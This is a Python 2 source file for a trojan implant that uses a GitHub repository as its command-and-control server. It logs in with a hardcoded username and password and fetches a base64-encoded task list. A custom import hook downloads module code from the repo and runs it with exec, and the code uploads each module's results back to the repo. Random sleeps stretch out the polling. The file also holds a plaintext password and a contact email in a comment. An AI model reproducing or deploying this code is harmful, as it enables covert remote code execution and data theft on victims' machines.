import os
import sys
import json
import base64
import time
import imp
import random
import threading
import Queue

from github3 import login

null_id = '1234'
null_config = '%s.json' % null_id
data_path = 'data/%s/' % null_id
null_modules = []
task_queue = Queue.Queue()
configured = False
#email: bedohuwuz@7rent.top; host:null-host;

def connect_to_github():
	print('[*] Connecting to master..')
	try:
		gh = login(username='null-host',password='lenovog471')
		repo = gh.repository('null-host','null')
		branch = repo.branch('master')
		return gh,repo,branch
	except Exception as ex:
		print('[*] Exception While connecting to master!!')
		print('[*] Exiting!!')
		sys.exit(0)

def get_file_content(filepath):
	gh,repo,branch = connect_to_github()
	tree = branch.commit.commit.tree.recurse()

	for filename in tree.tree:
		if filepath in filename.path:
			print('[*] found file {0}').format(filepath)
			blob = repo.blob(filename._json_data['sha'])
			return blob.content

	return None

def get_null_config():
	global configured
	config_json = get_file_content(null_config)
	config = json.loads(base64.b64decode(config_json))
	configured = True

	for task in config:
		if task['module'] not in sys.modules:
			exec("import %s" % task['module'])

	return config

def store_module_result(data):
	gh,repo,branch = connect_to_github()
	remote_path = 'data/%s/%d.data' % (null_id,random.randint(1000,10000))
	repo.create_file(remote_path,'data pushed!!',base64.b64encode(data))

	return

class GitImporter(object):

	def __init__(self):
		self.current_module_code = ""

	def find_module(self,fullname,path=None):
		if configured:
			print('[*] Arrempint to retrive {0}').format(fullname)
			new_liberary = get_file_content('modules/%s' % fullname)

			if new_liberary is not None:
				self.current_module_code = base64.b64decode(new_liberary)
				return self

		return None

	def load_module(self,name):

		module = imp.new_module(name)
		exec self.current_module_code in module.__dict__
		sys.modules[name] = module

		return module

def module_runner(module):

	try:
		task_queue.put(1)
		result = sys.modules[module].run()
		task_queue.get()

		store_module_result(result)

	except Exception as ex:
		print "[*] Error in module Runner.=>"+str(ex)
	return

sys.meta_path = [GitImporter()]
while True:

	if task_queue.empty():
		config = get_null_config()

		for task in config:
			t = threading.Thread(target=module_runner,args=(task['module'],))
			t.start()
			time.sleep(random.randint(1,10))

	time.sleep(random.randint(1000,10000))

